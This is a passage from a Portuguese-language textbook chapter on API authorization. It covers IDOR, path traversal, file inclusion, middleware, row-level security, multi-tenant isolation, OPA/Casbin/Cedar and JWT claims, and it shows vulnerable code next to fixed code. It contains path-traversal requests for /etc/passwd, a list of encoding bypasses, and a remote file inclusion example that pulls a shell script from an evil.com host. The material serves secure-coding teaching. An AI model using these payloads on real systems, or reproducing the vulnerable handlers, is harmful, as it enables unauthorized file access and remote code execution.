  res.json({ document: doc, permissions: token.permissions });
});
```

### 8.3.4 Estudo de Caso: IDOR em Plataforma de E-commerce (CVE-2019-XXXX)

Em uma plataforma de e-commerce popular, o endpoint `/api/v1/users/{userId}/addresses/{addressId}` retornava enderecos de entrega sem verificacao de ownership. Um atacante podia:

1. Enumerar userIds (sequenciais)
2. Acessar qualquer endereco de qualquer usuario
3. Extrair dados pessoais completos (nome, endereco, telefone)

```typescript
// VULNERAVEL: O endpoint original
app.get('/api/v1/users/:userId/addresses/:addressId', async (req, res) => {
  const address = await Address.findOne({
    userId: req.params.userId,
    _id: req.params.addressId,
  });

  // PROBLEMA: nao verifica se req.user.id === req.params.userId
  if (!address) {
    return res.status(404).json({ error: 'Address not found' });
  }

  res.json(address);
});

// FIX: Verificacao de ownership OBRIGATORIA
app.get('/api/v1/users/:userId/addresses/:addressId',
  authenticate,
  async (req, res) => {
    if (req.user.id !== req.params.userId && !req.user.isAdmin) {
      return res.status(403).json({ error: 'Access denied' });
    }

    const address = await Address.findOne({
      userId: req.params.userId,
      _id: req.params.addressId,
    });

    if (!address) {
      return res.status(404).json({ error: 'Address not found' });
    }

    res.json(address);
  }
);
```

---

## 8.4 Path Traversal e File Inclusion

Path traversal (tambem chamado de directory traversal) e uma vulnerabilidade que permite ao atacante acessar arquivos e diretorios fora do escopo pretendido do servico, manipulando variaveis de caminho que referenciam arquivos.

### 8.4.1 Vetores de Ataque

**Path Traversal basico:**

```
# Requisicao normal
GET /api/files/report.pdf

# Path traversal
GET /api/files/../../../etc/passwd
GET /api/files/..%2F..%2F..%2Fetc%2Fpasswd
GET /api/files/....//....//....//etc/passwd
```

**Sequencias de bypass comuns:**

| Bypass | Sequencia | Descricao |
|--------|-----------|-----------|
| Basico | `../` | Sequencia mais comum |
| URL encoded | `%2e%2e%2f` | Encode do ponto e barra |
| Double encoded | `%252e%252e%252f` | Duplo encode |
| Null byte | `../../../etc/passwd%00.jpg` | Null byte para ignorar extensao |
| Backslash | `..\..\..\etc\passwd` | Windows path separator |
| UNC path | `\\server\share\file` | Caminhos de rede Windows |

### 8.4.2 Local File Inclusion (LFI)

LFI permite que o atacante inclua arquivos locais no processamento do servidor:

```typescript
// VULNERAVEL: Inclusao de arquivo sem sanitizacao
app.get('/api/pages/:page', async (req, res) => {
  const pageName = req.params.page;
  const filePath = path.join(__dirname, 'pages', `${pageName}.html`);
  const content = fs.readFileSync(filePath, 'utf-8');
  res.send(content);
});

// Atacante pode enviar:
// GET /api/pages/../../../etc/passwd
// E o servico retorna o conteudo do /etc/passwd
```

### 8.4.3 Remote File Inclusion (RFI)

RFI permite que o atacante inclua arquivos de servidores remotos:

```php
// VULNERAVEL (PHP -- exemplo historico)
<?php
$page = $_GET['page'];
include($page);
// Atacante: ?page=http://evil.com/shell.txt
// O PHP inclui e executa o script remoto
?>
```

### 8.4.4 Prevencoes Robustas

**Sanitizacao de caminhos em TypeScript/Node.js:**

```typescript
import path from 'path';

function safeFilePath(baseDir: string, userInput: string): string | null {
  // Normaliza o caminho
  const normalized = path.normalize(userInput);

  // Remove variaveis de navegacao
  if (normalized.includes('..') || normalized.includes('~')) {
    return null;
  }

  // Resolve o caminho completo
  const resolved = path.resolve(baseDir, normalized);

  // Verifica se o resultado ainda esta dentro do diretorio base
  if (!resolved.startsWith(path.resolve(baseDir))) {
    return null;
  }

  return resolved;
}

// Uso
app.get('/api/files/:filename', async (req, res) => {
  const safePath = safeFilePath('/var/uploads', req.params.filename);
  if (!safePath) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  if (!fs.existsSync(safePath)) {
    return res.status(404).json({ error: 'File not found' });
  }

  res.sendFile(safePath);
});
```

**Sanitizacao em Go:**

```go
import (
    "path/filepath"
    "strings"
)

func safeFilePath(baseDir string, userInput string) (string, error) {
    // Limpa a entrada
    cleaned := filepath.Clean(userInput)

    // Verifica traversal
    if strings.Contains(cleaned, "..") {
        return "", fmt.Errorf("path traversal detected")
    }

    // Resolve caminho completo
    fullPath := filepath.Join(baseDir, cleaned)

    // Verifica se esta dentro do diretorio base
    absBase, _ := filepath.Abs(baseDir)
    absFull, _ := filepath.Abs(fullPath)

    if !strings.HasPrefix(absFull, absBase) {
        return "", fmt.Errorf("path escapes base directory")
    }

    return fullPath, nil
}
```

**Servidor web com protecoes contra path traversal:**

```typescript
import express from 'express';
import path from 'path';
import fs from 'fs';
import { RateLimiterMemory } from 'rate-limiter-flexible';

const app = express();

const rateLimiter = new RateLimiterMemory({
  points: 10,
  duration: 60,
});

const UPLOAD_DIR = '/var/app/uploads';
const ALLOWED_EXTENSIONS = ['.pdf', '.jpg', '.png', '.txt', '.csv'];

function isPathSafe(baseDir: string, requestedPath: string): boolean {
  const resolved = path.resolve(baseDir, requestedPath);
  const normalizedBase = path.resolve(baseDir);

  return resolved.startsWith(normalizedBase + path.sep) ||
         resolved === normalizedBase;
}

function hasAllowedExtension(filename: string): boolean {
  const ext = path.extname(filename).toLowerCase();
  return ALLOWED_EXTENSIONS.includes(ext);
}

app.get('/api/files/:filename', async (req, res) => {
  try {
    await rateLimiter.consume(req.ip);
  } catch {
    return res.status(429).json({ error: 'Too many requests' });
  }

  const filename = path.basename(req.params.filename);

  if (!hasAllowedExtension(filename)) {
    return res.status(400).json({ error: 'File type not allowed' });
  }

  if (!isPathSafe(UPLOAD_DIR, filename)) {
    return res.status(400).json({ error: 'Invalid file path' });
  }

  const filePath = path.join(UPLOAD_DIR, filename);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }

  const stat = fs.statSync(filePath);
  if (stat.isDirectory()) {
    return res.status(400).json({ error: 'Invalid file path' });
  }

  // Log para auditoria
  console.log(`File access: user=${req.user?.id} file=${filename} ip=${req.ip}`);

  res.sendFile(filePath);
});
```

---

## 8.5 Autorizacao em APIs: Padroes de Middleware

Middleware de autorizacao e o ponto onde decisoes de acesso sao tomadas em APIs web. Um middleware bem projetado e consistente e a diferenca entre um sistema seguro e um fragil.

### 8.5.1 Arquitetura de Middleware de Autorizacao

```
Request -> [Rate Limiter] -> [Authentication] -> [Authorization] -> [Handler]
               |                    |                   |
               v                    v                   v
           Throttle            Validate JWT        Check permissions
           if exceeded         Attach user          Apply policy
                               to request           Log decision
```

### 8.5.2 Middleware de Autorizacao em Express.js

```typescript
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

interface AuthenticatedRequest extends Request {
  user?: {
    id: string;
    email: string;
    roles: string[];
    permissions: string[];
    tenantId?: string;
  };
}

interface AuthorizationOptions {
  permissions?: string[];
  roles?: string[];
  requireAll?: boolean;
  resourceOwner?: (req: AuthenticatedRequest) => Promise<string | null>;
}

function authenticate(secret: string) {
  return (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
    const authHeader = req.headers.authorization;

    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Missing or invalid authorization header' });
    }

    const token = authHeader.substring(7);

    try {
      const decoded = jwt.verify(token, secret) as any;
      req.user = {
        id: decoded.sub,
        email: decoded.email,
        roles: decoded.roles || [],
        permissions: decoded.permissions || [],
        tenantId: decoded.tenantId,
      };
      next();
    } catch (err) {
      if (err instanceof jwt.TokenExpiredError) {
        return res.status(401).json({ error: 'Token expired' });
      }
      return res.status(401).json({ error: 'Invalid token' });
    }
  };
}

function authorize(options: AuthorizationOptions) {
  return async (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    // Check roles
    if (options.roles && options.roles.length > 0) {
      const hasRole = options.requireAll
        ? options.roles.every(role => req.user!.roles.includes(role))
        : options.roles.some(role => req.user!.roles.includes(role));

      if (!hasRole) {
        return res.status(403).json({ error: 'Insufficient role' });
      }
    }

    // Check permissions
    if (options.permissions && options.permissions.length > 0) {
      const hasPermission = options.requireAll
        ? options.permissions.every(perm => req.user!.permissions.includes(perm))
        : options.permissions.some(perm => req.user!.permissions.includes(perm));

      if (!hasPermission) {
        return res.status(403).json({ error: 'Insufficient permissions' });
      }
    }

    // Check resource ownership
    if (options.resourceOwner) {
      const ownerId = await options.resourceOwner(req);
      if (ownerId && ownerId !== req.user.id && !req.user.roles.includes('admin')) {
        return res.status(403).json({ error: 'Not resource owner' });
      }
    }

    next();
  };
}

// Uso
app.get('/api/users/:id',
  authenticate(JWT_SECRET),
  authorize({ resourceOwner: async (req) => req.params.id }),
  getUserHandler
);

app.delete('/api/users/:id',
  authenticate(JWT_SECRET),
  authorize({ permissions: ['users:delete'] }),
  deleteUserHandler
);

app.post('/api/billing/invoices',
  authenticate(JWT_SECRET),
  authorize({ permissions: ['invoices:create', 'billing:manage'], requireAll: true }),
  createInvoiceHandler
);
```

### 8.5.3 Middleware de Autorizacao em Go

```go
package middleware

import (
    "context"
    "net/http"
    "strings"
    "time"
)

type contextKey string

const UserContextKey contextKey = "user"

type User struct {
    ID          string
    Email       string
    Roles       []string
    Permissions []string
    TenantID    string
}

type AuthMiddleware struct {
    secret []byte
}

func NewAuthMiddleware(secret []byte) *AuthMiddleware {
    return &AuthMiddleware{secret: secret}
}

func (m *AuthMiddleware) Authenticate(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        authHeader := r.Header.Get("Authorization")
        if authHeader == "" || !strings.HasPrefix(authHeader, "Bearer ") {
            http.Error(w, `{"error":"missing authorization header"}`, http.StatusUnauthorized)
            return
        }

        tokenString := strings.TrimPrefix(authHeader, "Bearer ")
        claims, err := validateJWT(tokenString, m.secret)
        if err != nil {
            http.Error(w, `{"error":"invalid token"}`, http.StatusUnauthorized)
            return
        }

        user := &User{
            ID:          claims.Subject,
            Email:       claims.Email,
            Roles:       claims.Roles,
            Permissions: claims.Permissions,
            TenantID:    claims.TenantID,
        }

        ctx := context.WithValue(r.Context(), UserContextKey, user)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}

func RequirePermission(permission string, next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        user, ok := r.Context().Value(UserContextKey).(*User)
        if !ok {
            http.Error(w, `{"error":"not authenticated"}`, http.StatusUnauthorized)
            return
        }

        if !contains(user.Permissions, permission) {
            http.Error(w, `{"error":"insufficient permissions"}`, http.StatusForbidden)
            return
        }

        next.ServeHTTP(w, r)
    })
}

func RequireRole(role string, next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        user, ok := r.Context().Value(UserContextKey).(*User)
        if !ok {
            http.Error(w, `{"error":"not authenticated"}`, http.StatusUnauthorized)
            return
        }

        if !contains(user.Roles, role) && !contains(user.Roles, "admin") {
            http.Error(w, `{"error":"insufficient role"}`, http.StatusForbidden)
            return
        }

        next.ServeHTTP(w, r)
    })
}

func RequireOwnership(resourceGetter func(r *http.Request) (string, error), next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        user, ok := r.Context().Value(UserContextKey).(*User)
        if !ok {
            http.Error(w, `{"error":"not authenticated"}`, http.StatusUnauthorized)
            return
        }

        if contains(user.Roles, "admin") {
            next.ServeHTTP(w, r)
            return
        }

        ownerID, err := resourceGetter(r)
        if err != nil {
            http.Error(w, `{"error":"resource not found"}`, http.StatusNotFound)
            return
        }

        if ownerID != user.ID {
            http.Error(w, `{"error":"access denied"}`, http.StatusForbidden)
            return
        }

        next.ServeHTTP(w, r)
    })
}

func contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}

type JWTClaims struct {
    Subject     string
    Email       string
    Roles       []string
    Permissions []string
    TenantID    string
    ExpiresAt   time.Time
}

func validateJWT(tokenString string, secret []byte) (*JWTClaims, error) {
    // Validacao simplificada -- em producao, use biblioteca JWT adequada
    // Verifique a secao 8.10 deste capitulo para implementacao completa
    return nil, nil
}
```

### 8.5.4 Chain of Responsibility para Autorizacao

```typescript
interface AuthCheck {
  name: string;
  check: (req: AuthenticatedRequest) => Promise<{ allowed: boolean; reason?: string }>;
}

class AuthorizationChain {
  private checks: AuthCheck[] = [];

  addCheck(check: AuthCheck): this {
    this.checks.push(check);
    return this;
  }

  middleware() {
    return async (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
      for (const check of this.checks) {
        const result = await check.check(req);

        if (!result.allowed) {
          console.log(`Auth denied: check=${check.name} reason=${result.reason} user=${req.user?.id}`);
          return res.status(403).json({
            error: 'Access denied',
            failedCheck: check.name,
            reason: result.reason,
          });
        }
      }

      next();
    };
  }
}

// Uso
const authChain = new AuthorizationChain()
  .addCheck({
    name: 'is-authenticated',
    check: async (req) => ({
      allowed: !!req.user,
      reason: req.user ? undefined : 'User not authenticated',
    }),
  })
  .addCheck({
    name: 'has-required-role',
    check: async (req) => ({
      allowed: req.user!.roles.includes('editor') || req.user!.roles.includes('admin'),
      reason: 'Editor or admin role required',
    }),
  })
  .addCheck({
    name: 'account-not-suspended',
    check: async (req) => {
      const account = await db.accounts.findById(req.user!.id);
      return {
        allowed: account?.status === 'active',
        reason: account?.status === 'suspended' ? 'Account is suspended' : undefined,
      };
    },
  });

app.post('/api/articles', authenticate(JWT_SECRET), authChain.middleware(), createArticle);
```

---

## 8.6 Row-Level Security em Bancos de Dados

Row-Level Security (RLS) e uma funcionalidade de banco de dados que filtra automaticamente linhas com base no contexto da conexao ou da consulta. E uma camada de defesa essencial que protege mesmo quando a aplicacao tem bugs de autorizacao.

### 8.6.1 RLS em PostgreSQL

PostgreSQL suporta RLS nativamente desde a versao 9.5:

```sql
-- Habilitar RLS na tabela
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;

-- Criar politicas
-- Politica 1: Usuarios so veem seus proprios pedidos
CREATE POLICY user_orders_select ON orders
  FOR SELECT
  USING (user_id = current_setting('app.current_user_id')::uuid);

-- Politica 2: Usuarios so podem inserir pedidos para si mesmos
CREATE POLICY user_orders_insert ON orders
  FOR INSERT
  WITH CHECK (user_id = current_setting('app.current_user_id')::uuid);

-- Politica 3: Usuarios so podem atualizar seus proprios pedidos
CREATE POLICY user_orders_update ON orders
  FOR UPDATE
  USING (user_id = current_setting('app.current_user_id')::uuid)
  WITH CHECK (user_id = current_setting('app.current_user_id')::uuid);

-- Politica 4: Admin pode acessar todos os pedidos
CREATE POLICY admin_orders_all ON orders
  FOR ALL
  USING (current_setting('app.current_user_role') = 'admin');

-- Configurar o contexto da sessao antes de cada consulta
SET app.current_user_id = '550e8400-e29b-41d4-a716-446655440000';
SET app.current_user_role = 'editor';
```

### 8.6.2 RLS Multi-Tenant

```sql
-- Tabela multi-tenant
ALTER TABLE products ENABLE ROW LEVEL SECURITY;

-- Politica: cada tenant so ve seus produtos
CREATE POLICY tenant_isolation ON products
  USING (tenant_id = current_setting('app.current_tenant_id')::uuid);

-- Admin global pode ver tudo
CREATE POLICY admin_global ON products
  USING (current_setting('app.current_user_role') = 'super_admin');

-- Configurar contexto
SET app.current_tenant_id = 'tenant-uuid-here';
SET app.current_user_id = 'user-uuid-here';
SET app.current_user_role = 'editor';
```

### 8.6.3 RLS em Aplicacao (Padrao Repository)

```typescript
import { Pool } from 'pg';

class SecureDatabase {
  private pool: Pool;

  constructor(config: any) {
    this.pool = new Pool(config);
  }

  async withUserContext<T>(
    userId: string,
    tenantId: string,
    userRole: string,
    callback: (client: any) => Promise<T>
  ): Promise<T> {
    const client = await this.pool.connect();
    try {
      await client.query('BEGIN');
      await client.query(`SET app.current_user_id = $1`, [userId]);
      await client.query(`SET app.current_tenant_id = $1`, [tenantId]);
      await client.query(`SET app.current_user_role = $1`, [userRole]);

      const result = await callback(client);

      await client.query('COMMIT');
      return result;
    } catch (err) {
      await client.query('ROLLBACK');
      throw err;
    } finally {
      client.release();
    }
  }

  async getOrders(userId: string, tenantId: string, userRole: string) {
    return this.withUserContext(userId, tenantId, userRole, async (client) => {
      // A politica RLS filtra automaticamente
      const result = await client.query('SELECT * FROM orders ORDER BY created_at DESC');
      return result.rows;
    });
  }
}
```

---

## 8.7 Autorizacao Multi-Tenant

Multi-tenancy e uma arquitetura onde uma instancia unica de software atende multiplos clientes (tenants). Cada tenant e isolado dos demais, e seus dados e configuracoes nao devem ser acessiveis por outros tenants.

### 8.7.1 Modelos de Isolamento

| Modelo | Isolamento | Custo | Complexidade | Exemplo |
|--------|-----------|-------|-------------|---------|
| **Database per tenant** | Maximo | Alto | Baixa | Enterprise SaaS |
| **Schema per tenant** | Alto | Medio | Media | Mid-market SaaS |
| **Shared database, shared schema** | Basico | Baixo | Alta | Multi-tenant API |

### 8.7.2 Shared Schema com Tenant ID

```sql
-- Tabela com isolamento por tenant_id
CREATE TABLE documents (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  tenant_id UUID NOT NULL REFERENCES tenants(id),
  title TEXT NOT NULL,
  content TEXT,
  created_by UUID NOT NULL REFERENCES users(id),
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Indice composto para performance
CREATE INDEX idx_documents_tenant ON documents(tenant_id, created_at DESC);

-- Habilitar RLS
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

CREATE POLICY tenant_isolation ON documents
  USING (tenant_id = current_setting('app.current_tenant_id')::uuid);
```

### 8.7.3 Tenant Context Middleware

```typescript
import { Request, Response, NextFunction } from 'express';

interface TenantContext {
  tenantId: string;
  tenantName: string;
  features: string[];
  limits: {
    maxUsers: number;
    maxStorage: number;
    maxApiCalls: number;
  };
}

declare global {
  namespace Express {
    interface Request {
      tenant?: TenantContext;
    }
  }
}

async function tenantMiddleware(req: Request, res: Response, next: NextFunction) {
  const tenantId = req.user?.tenantId;

  if (!tenantId) {
    return res.status(403).json({ error: 'No tenant context' });
  }

  const tenant = await cache.get(`tenant:${tenantId}`) || await loadTenant(tenantId);

  if (!tenant || tenant.status !== 'active') {
    return res.status(403).json({ error: 'Tenant inactive or not found' });
  }

  req.tenant = {
    tenantId: tenant.id,
    tenantName: tenant.name,
    features: tenant.features,
    limits: tenant.limits,
  };

  // Verificar limites do tenant
  const usage = await getTenantUsage(tenantId);

  if (usage.apiCalls >= tenant.limits.maxApiCalls) {
    return res.status(429).json({ error: 'API rate limit exceeded for tenant' });
  }

  if (usage.storage >= tenant.limits.maxStorage) {
    return res.status(507).json({ error: 'Storage limit exceeded for tenant' });
  }

  next();
}

// Uso em rotas
app.use('/api', authenticate(JWT_SECRET), tenantMiddleware);

// Rotas que precisam de tenant
app.get('/api/documents', listDocuments);
app.post('/api/documents', createDocument);
```

### 8.7.4 Protecao contra Cross-Tenant Access

```typescript
class TenantGuard {
  static async ensureTenantAccess(
    userId: string,
    tenantId: string,
    resourceType: string,
    resourceId: string
  ): Promise<boolean> {
    const resource = await db[resourceType].findById(resourceId);

    if (!resource) return false;

    if (resource.tenantId !== tenantId) {
      // Log de tentativa de acesso cross-tenant
      await auditLog.log({
        event: 'cross_tenant_access_attempt',
        userId,
        tenantId,
        resourceType,
        resourceId,
        resourceTenantId: resource.tenantId,
        severity: 'critical',
      });
      return false;
    }

    return true;
  }

  static middleware(resourceType: string) {
    return async (req: Request, res: Response, next: NextFunction) => {
      const resourceId = req.params.id;
      const userId = req.user?.id;
      const tenantId = req.tenant?.tenantId;

      if (!userId || !tenantId || !resourceId) {
        return res.status(400).json({ error: 'Missing required context' });
      }

      const hasAccess = await TenantGuard.ensureTenantAccess(
        userId, tenantId, resourceType, resourceId
      );

      if (!hasAccess) {
        return res.status(404).json({ error: 'Resource not found' });
      }

      next();
    };
  }
}

// Uso
app.get('/api/documents/:id',
  authenticate(JWT_SECRET),
  tenantMiddleware,
  TenantGuard.middleware('documents'),
  getDocumentHandler
);
```

---

## 8.8 Autorizacao em Microservicos: OPA, Casbin, Cedar

Em arquiteturas de microservicos, autorizacao se torna um problema distribuido. Cada servico pode ter suas proprias regras, mas decisões devem ser consistentes e auditaveis.

### 8.8.1 Open Policy Agent (OPA)

OPA e uma engine de politicas general-purpose que separa decisoes de autorizacao da logica da aplicacao. Politicas sao escritas em Rego, uma linguagem declarativa.

**Exemplo de politica OPA em Rego:**

```rego
# policy.rego
package authz

default allow = false

# Administradores podem fazer tudo
allow {
    input.user.role == "admin"
}

# Usuarios podem ler seus proprios dados
allow {
    input.action == "read"
    input.resource.owner == input.user.id
}

# Usuarios podem atualizar seus proprios dados (exceto role e tenant)
allow {
    input.action == "update"
    input.resource.owner == input.user.id
    not input.changes.role
    not input.changes.tenant_id
}

# Membros da equipe podem ler recursos da equipe
allow {
    input.action == "read"
    input.resource.team_id == input.user.team_id
    input.user.role == "member"
}

# Negar acesso a dados sensiveis fora do horario comercial
deny {
    input.resource.classification == "secret"
    time.now.hour() < 9
    time.now.hour() > 17
}

# Negar operacoes destrutivas sem confirmacao
deny {
    input.action == "delete"
    not input.confirmed
}
```

**Integracao OPA com Express.js:**

```typescript
import http from 'http';

class OPAClient {
  private baseUrl: string;

  constructor(baseUrl: string) {
    this.baseUrl = baseUrl;
  }

  async check(input: Record<string, any>): Promise<{ allow: boolean; reasons: string[] }> {
    const response = await fetch(`${this.baseUrl}/v1/data/authz/allow`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ input }),
    });

    const result = await response.json();
    return {
      allow: result.result === true,
      reasons: result.reasons || [],
    };
  }
}

const opa = new OPAClient('http://localhost:8181');

function requireOPAAuthorization(resourceType: string, action: string) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const decision = await opa.check({
      user: {
        id: req.user!.id,
        role: req.user!.roles[0],
        team_id: req.user!.teamId,
      },
      action,
      resource: {
        type: resourceType,
        id: req.params.id,
        owner: req.resource?.userId,
        team_id: req.resource?.teamId,
        classification: req.resource?.classification,
      },
      changes: req.body,
      confirmed: req.query.confirmed === 'true',
      context: {
        ip: req.ip,
        timestamp: new Date().toISOString(),
      },
    });

    if (!decision.allow) {
      return res.status(403).json({
        error: 'Access denied by policy',
        reasons: decision.reasons,
      });
    }

    next();
  };
}

// Uso
app.delete('/api/documents/:id',
  authenticate(JWT_SECRET),
  requireOPAAuthorization('document', 'delete'),
  deleteDocumentHandler
);
```

### 8.8.2 Casbin

Casbin e uma biblioteca de autorizacao que suporta multiplos modelos de controle de acesso (ACL, RBAC, ABAC, etc.) e multiplos adaptadores de armazenamento.

**Modelo RBAC em Casbin:**

```ini
# model.conf
[request_definition]
r = sub, obj, obj.act

[policy_definition]
p = sub_role, obj, act

[role_definition]
g = _, _

[matchers]
m = g(r.sub_role, p.sub_role) && r.obj == p.obj && r.act == p.act
```

**Politicas em CSV:**

```csv
# policy.csv
p, admin, *, *
p, editor, articles, create
p, editor, articles, read
p, editor, articles, update
p, viewer, articles, read
g, alice, admin
g, bob, editor
g, charlie, viewer
```

**Integracao Casbin com Go:**

```go
package main

import (
    "log"
    "net/http"

    "github.com/casbin/casbin/v2"
    "github.com/casbin/casbin/v2/model"
    gormadapter "github.com/casbin/gorm-adapter/v3"
    "gorm.io/driver/postgres"
    "gorm.io/gorm"
)

func main() {
    // Conectar ao banco
    dsn := "host=localhost user=auth dbname=authz port=5432 sslmode=disable"
    db, err := gorm.Open(postgres.Open(dsn), &gorm.Config{})
    if err != nil {
        log.Fatal(err)
    }

    // Criar adaptador GORM
    adapter, err := gormadapter.NewAdapterByDB(db)
    if err != nil {
        log.Fatal(err)
    }

    // Carregar modelo
    modelText := `
    [request_definition]
    r = sub, obj, act

    [policy_definition]
    p = sub_role, obj, act

    [role_definition]
    g = _, _

    [matchers]
    m = g(r.sub_role, p.sub_role) && keyMatch2(r.obj, p.obj) && r.act == p.act
    `

    m, err := model.NewModelFromString(modelText)
    if err != nil {
        log.Fatal(err)
    }

    // Criar enforcer
    enforcer, err := casbin.NewEnforcer(m, adapter)
    if err != nil {
        log.Fatal(err)
    }

    // Carregar politicas
    err = enforcer.LoadPolicy()
    if err != nil {
        log.Fatal(err)
    }

    // Middleware
    authMiddleware := func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            // Extrair role do usuario do token JWT
            userRole := extractRoleFromToken(r)

            // Verificar permissao
            allowed, err := enforcer.Enforce(userRole, r.URL.Path, r.Method)
            if err != nil {
                http.Error(w, "Authorization error", http.StatusInternalServerError)
                return
            }

            if !allowed {
                http.Error(w, "Forbidden", http.StatusForbidden)
                return
            }

            next.ServeHTTP(w, r)
        })
    }

    // Aplicar middleware
    mux := http.NewServeMux()
    mux.Handle("/api/documents/", authMiddleware(http.HandlerFunc(documentHandler)))

    log.Fatal(http.ListenAndServe(":8080", mux))
}
```

### 8.8.3 Amazon Cedar

Cedar e uma linguagem de autorizacao desenvolvida pela Amazon, projetada para ser segura por construcao. Ela impoe restricoes na linguagem que previnem classes inteiras de erros comuns.

**Exemplo de politica Cedar:**

```cedar
// Permitir ao proprietario ler e escrever em seus proprios documentos
permit(
  principal == Document::"doc-123".owner,
  action in [Action::"read", Action::"write"],
  resource == Document::"doc-123"
);

// Permitir que membros da equipe leiam documentos da equipe
permit(
  principal in Team::"eng",
  action == Action::"read",
  resource in Document::"eng-*"
);

// Negar acesso a documentos arquivados
forbid(
  principal,
  action,
  resource
) when { resource.status == "archived" };

// Condicional: apenas em horario comercial
permit(
  principal in Role::"support",
  action == Action::"read",
  resource
) when {
  context.time.hour >= 9 && context.time.hour <= 17
};
```

**Integracao Cedar com Node.js:**

```typescript
import { CedarEngine } from '@cedar-policy/cedar-node';

class CedarAuthorizer {
  private engine: CedarEngine;
  private policies: string[];

  constructor() {
    this.engine = new CedarEngine();
    this.policies = [];
  }

  loadPolicies(policyStrings: string[]): void {
    this.policies = policyStrings;
    this.engine.loadPolicies(policyStrings);
  }

  async authorize(
    principal: string,
    action: string,
    resource: string,
    context: Record<string, any>
  ): Promise<{ allowed: boolean; diagnostics: any }> {
    const request = {
      principal,
      action,
      resource,
      context,
    };

    const response = this.engine.isAuthorized(request);

    return {
      allowed: response.decision === 'Allow',
      diagnostics: response.diagnostics,
    };
  }
}

// Uso
const cedar = new CedarAuthorizer();
cedar.loadPolicies([
  'permit(principal, action == Action::"read", resource);',
  'forbid(principal, action == Action::"delete", resource) when { resource.classified };',
]);

app.get('/api/documents/:id', async (req, res) => {
  const result = await cedar.authorize(
    `User::"${req.user!.id}"`,
    'Action::"read"',
    `Document::"${req.params.id}"`,
    { time: new Date().toISOString(), ip: req.ip }
  );

  if (!result.allowed) {
    return res.status(403).json({ error: 'Access denied by Cedar policy' });
  }

  // Processar requisicao...
});
```

---

## 8.9 JWT Claims para Autorizacao

JWTs sao frequentemente usados tanto para autenticacao quanto para autorizacao. As claims (afirmacoes) dentro de um JWT podem conter informacoes que o servidor usa para tomar decisoes de acesso, sem precisar consultar um banco de dados a cada requisicao.

### 8.9.1 Estrutura de um JWT para Autorizacao

```typescript
interface AuthorizationJWTClaims {
  // Padrao OIDC
  sub: string;           // Subject (user ID)
  iss: string;           // Issuer
  aud: string;           // Audience
  exp: number;           // Expiration
  iat: number;           // Issued at
  jti: string;           // JWT ID (para revogacao)

  // Claims de autorizacao
  roles: string[];
  permissions: string[];
  tenantId: string;
  teamId?: string;

  // Claims de contexto
  mfaVerified: boolean;
  authMethod: string;
  sessionId: string;
}
```

### 8.9.2 Gerao Segura de JWTs com Claims de Autorizacao

```typescript
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

interface TokenPair {
  accessToken: string;
  refreshToken: string;
  expiresIn: number;
}

class SecureTokenService {
  private privateKey: string;
  private publicKey: string;
  private refreshSecret: string;

  constructor() {
    // Usar chave RSA asymmetric para production
    const keyPair = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });

    this.privateKey = keyPair.privateKey;
    this.publicKey = keyPair.publicKey;
    this.refreshSecret = process.env.JWT_REFRESH_SECRET!;
  }

  async generateTokenPair(user: User, session: Session): Promise<TokenPair> {
    const jti = crypto.randomUUID();

    const accessClaims: AuthorizationJWTClaims = {
      sub: user.id,
      iss: 'auth-service',
      aud: 'api-service',
      exp: Math.floor(Date.now() / 1000) + 900, // 15 minutos
      iat: Math.floor(Date.now() / 1000),
      jti,
      roles: user.roles,
      permissions: user.permissions,
      tenantId: user.tenantId,
      teamId: user.teamId,
      mfaVerified: session.mfaVerified,
      authMethod: session.authMethod,
      sessionId: session.id,
    };

    const accessToken = jwt.sign(accessClaims, this.privateKey, {
      algorithm: 'RS256',
    });

    const refreshClaims = {
      sub: user.id,
      jti: crypto.randomUUID(),
      sessionId: session.id,
      type: 'refresh',
    };

    const refreshToken = jwt.sign(refreshClaims, this.refreshSecret, {
      algorithm: 'HS256',
      expiresIn: '7d',
    });

    return {
      accessToken,
      refreshToken,
      expiresIn: 900,
    };
  }

  verifyAccessToken(token: string): AuthorizationJWTClaims {
    return jwt.verify(token, this.publicKey, {
      algorithms: ['RS256'],
      issuer: 'auth-service',
      audience: 'api-service',
    }) as AuthorizationJWTClaims;
  }
}
```

### 8.9.3 Validacao de Claims no Middleware

```typescript
function validateAuthorizationClaims(requiredClaims: {
  roles?: string[];
  permissions?: string[];
  requireMfa?: boolean;
  maxTokenAge?: number;
}) {
  return (req: Request, res: Response, next: NextFunction) => {
    const claims = req.claims as AuthorizationJWTClaims;

    if (!claims) {
      return res.status(401).json({ error: 'No claims found' });
    }

    // Verificar idade do token
    if (requiredClaims.maxTokenAge) {
      const tokenAge = Math.floor(Date.now() / 1000) - claims.iat;
      if (tokenAge > requiredClaims.maxTokenAge) {
        return res.status(401).json({ error: 'Token too old -- refresh required' });
      }
    }

    // Verificar roles
    if (requiredClaims.roles) {
